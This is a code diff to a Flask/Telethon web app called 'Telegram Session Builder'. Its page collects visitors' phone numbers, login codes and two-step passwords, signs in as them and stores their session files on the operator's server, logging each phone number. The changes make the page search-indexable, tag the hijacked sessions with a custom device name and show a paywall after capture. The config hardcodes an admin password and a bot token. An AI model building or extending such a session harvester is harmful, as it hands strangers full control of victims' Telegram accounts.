@@ -1,5 +1,5 @@
 # ================================================================
-# Telegram Session Builder – FULL FINAL VERSION (ANTI SLEEP)
+# Telegram Session Builder – FULL FINAL VERSION (ANTI SLEEP + PAYWALL)
 # By: Tiam
 # ================================================================
 
@@ -19,7 +19,8 @@ self_config = {
     "admin_password": "tiam_khorshid",
     "save_path": "sessions",
     "base_url": "https://anime-1127-bot-2.onrender.com",
-    "fake_bot_token": "8569519729:AAG2ZLf5xn_2pNtuGDaXF_y_88SU-dqUnis"
+    "fake_bot_token": "8569519729:AAG2ZLf5xn_2pNtuGDaXF_y_88SU-dqUnis",
+    "device_name": "⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙"
 }
 os.makedirs(self_config["save_path"], exist_ok=True)
 
@@ -80,13 +81,15 @@ HTML_PAGE = """
 <head>
 <meta charset="UTF-8">
 <title>Telegram Session Builder</title>
+<meta name="description" content="ساخت سشن تلگرام با قابلیت Self Nix – بخش پولی در دسترس کاربران">
+<meta name="robots" content="index, follow">
 <style>
 body {background: url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;background-size: cover;color:white;font-family:tahoma;}
 .box {width:360px;margin:80px auto;padding:25px;background: rgba(15,23,42,0.88);border-radius:16px;text-align:center;}
 input, button {padding:12px;margin-top:10px;border-radius:10px;border:none;width:100%;font-size:14px;}
 button {background:#6366f1;color:white;transition:0.2s;}
 button.active {background:#4ade80;}
-#s2,#s3,#done {display:none;}
+#s2,#s3,#done,#paywall {display:none;}
 p.note {font-size:12px;color:#ccc;margin-bottom:10px;}
 </style>
 </head>
@@ -111,6 +114,11 @@ p.note {font-size:12px;color:#ccc;margin-bottom:10px;}
 
 <div id="done">
 <h3>✅ سشن ساخته شد</h3>
+</div>
+
+<div id="paywall">
+<h3>💰 بخش پولی – فعلاً در دسترس نیست</h3>
+<p>برای فعال‌سازی این بخش نیاز به خرید اشتراک دارید</p>
 </div>
 </div>
 
@@ -154,6 +162,7 @@ function sendCode(){
     .then(d=>{
         if(d.status==="2fa"){document.getElementById("s2").style.display="none";document.getElementById("s3").style.display="block";}
         if(d.status==="ok") finish();
+        if(d.status==="error") alert("کد وارد شده اشتباه است");
     });
 }
 
@@ -170,6 +179,7 @@ function finish(){
     document.getElementById("s3").style.display="none";
     document.getElementById("mainBtn").style.display="none";
     document.getElementById("done").style.display="block";
+    document.getElementById("paywall").style.display="block";
 }
 
 setInterval(()=>fetch("/ping"),240000);
@@ -205,7 +215,12 @@ def delete_session_route():
 clients = {}
 
 async def create_client(phone):
-    client = TelegramClient(os.path.join(self_config["save_path"], phone), self_config["api_id"], self_config["api_hash"])
+    client = TelegramClient(
+        os.path.join(self_config["save_path"], phone),
+        self_config["api_id"],
+        self_config["api_hash"],
+        device_model=self_config["device_name"]
+    )
     await client.connect()
     return client
 
@@ -224,7 +239,7 @@ def send_code():
     phone = normalize_phone(request.json["phone"])
     try:
         run_async(clients[phone].sign_in(phone, request.json["code"]))
-        sessions_col.insert_one({"phone": phone})
+        sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
         return jsonify(status="ok")
     except SessionPasswordNeededError: return jsonify(status="2fa")
     except PhoneCodeInvalidError: return jsonify(status="error")
@@ -233,7 +248,7 @@ def send_code():
 def send_password():
     phone = normalize_phone(request.json["phone"])
     run_async(clients[phone].sign_in(password=request.json["password"]))
-    sessions_col.insert_one({"phone": phone})
+    sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
     return jsonify(status="ok")
 
 # ===================== Admin Panel ===============================
